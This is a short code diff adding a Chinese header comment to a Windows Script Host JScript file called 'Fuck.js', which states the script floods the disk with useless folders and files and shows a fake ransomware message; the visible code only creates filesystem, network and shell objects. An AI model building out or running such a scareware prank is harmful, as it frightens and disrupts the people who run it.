@@ -1,3 +1,8 @@
+/** 
+ * Fuck.js
+ * 用于生成大量无用文件夹、文件。并弹出假的勒索信息
+ * Microsoft ® Windows Based Script Host(脚本宿主)是一个脚本解释器, 一般是cscript.exe和wscript.exe, 用来运行.vbs和.js的文件
+*/
 var fso = new ActiveXObject("Scripting.FileSystemObject");
 var WshNetwork = new ActiveXObject("WScript.Network");
 var shell = WScript.CreateObject("WScript.Shell")
